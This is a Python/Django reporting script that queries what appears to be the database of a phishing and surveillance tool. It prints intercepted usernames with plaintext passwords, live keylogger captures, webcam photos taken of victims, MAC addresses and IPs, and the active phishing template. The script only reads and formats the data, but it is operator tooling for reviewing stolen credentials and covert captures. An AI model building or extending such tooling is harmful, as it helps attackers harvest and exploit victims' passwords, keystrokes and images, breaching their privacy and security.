import django, os, sys
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')
django.setup()

# Fix Windows encoding
sys.stdout.reconfigure(encoding='utf-8')

from django.db import connection

def run_sql(title, query):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")
    with connection.cursor() as cursor:
        cursor.execute(query)
        columns = [col[0] for col in cursor.description]
        rows = cursor.fetchall()

        if not rows:
            print("  [ NO DATA FOUND ]")
            return

        widths = [len(c) for c in columns]
        for row in rows:
            for i, val in enumerate(row):
                widths[i] = max(widths[i], len(str(val)[:45]))

        header = " | ".join(c.ljust(widths[i]) for i, c in enumerate(columns))
        print(f"  {header}")
        print(f"  {'-'*len(header)}")

        for row in rows:
            line = " | ".join(str(val)[:45].ljust(widths[i]) for i, val in enumerate(row))
            print(f"  {line}")

        print(f"\n  >>> Total: {len(rows)} rows")

print("\n" + "#"*70)
print("  CYBER-OPS DB -- PostgreSQL Direct Query Results")
print("#"*70)

run_sql(
    "1. SELECT * FROM logger_threatlog (All Credentials)",
    "SELECT id, intercepted_id, raw_password, "
    "LEFT(encrypted_token, 20) AS hash, "
    "geo_ip, risk_level, "
    "TO_CHAR(timestamp AT TIME ZONE 'Asia/Tashkent', 'MM-DD HH24:MI') AS time "
    "FROM logger_threatlog ORDER BY timestamp DESC"
)

run_sql(
    "2. SELECT WHERE risk_level='CRITICAL'",
    "SELECT id, intercepted_id, raw_password, geo_ip, risk_level "
    "FROM logger_threatlog WHERE risk_level = 'CRITICAL' ORDER BY timestamp DESC"
)

run_sql(
    "3. SELECT WHERE geo_ip != '127.0.0.1' (External IPs)",
    "SELECT id, intercepted_id, raw_password, geo_ip, mac_address, risk_level "
    "FROM logger_threatlog WHERE geo_ip != '127.0.0.1' ORDER BY timestamp DESC"
)

run_sql(
    "4. SELECT * FROM logger_livekeystroke (Live Keylogger)",
    "SELECT id, username_context, LEFT(keystrokes, 80) AS keystrokes_preview, "
    "TO_CHAR(timestamp AT TIME ZONE 'Asia/Tashkent', 'MM-DD HH24:MI') AS time "
    "FROM logger_livekeystroke ORDER BY timestamp DESC LIMIT 15"
)

run_sql(
    "5. GROUP BY risk_level (Threat Stats)",
    "SELECT risk_level, COUNT(*) AS count "
    "FROM logger_threatlog GROUP BY risk_level ORDER BY count DESC"
)

run_sql(
    "6. GROUP BY geo_ip (Attacks Per IP)",
    "SELECT geo_ip, COUNT(*) AS total, "
    "STRING_AGG(DISTINCT intercepted_id, ', ') AS usernames "
    "FROM logger_threatlog GROUP BY geo_ip ORDER BY total DESC"
)

run_sql(
    "7. WHERE webcam_snap IS NOT NULL (Has Photo Evidence)",
    "SELECT id, intercepted_id, raw_password, geo_ip, "
    "LENGTH(webcam_snap) AS photo_bytes, "
    "TO_CHAR(timestamp AT TIME ZONE 'Asia/Tashkent', 'MM-DD HH24:MI') AS time "
    "FROM logger_threatlog WHERE webcam_snap IS NOT NULL AND webcam_snap != '' ORDER BY timestamp DESC"
)

run_sql(
    "8. logger_activephishtemplate (Current Phishing Mode)",
    "SELECT id, template_name, "
    "TO_CHAR(updated_at AT TIME ZONE 'Asia/Tashkent', 'YYYY-MM-DD HH24:MI:SS') AS updated "
    "FROM logger_activephishtemplate"
)

print("\n" + "#"*70)
print("  END OF RESULTS")
print("#"*70 + "\n")
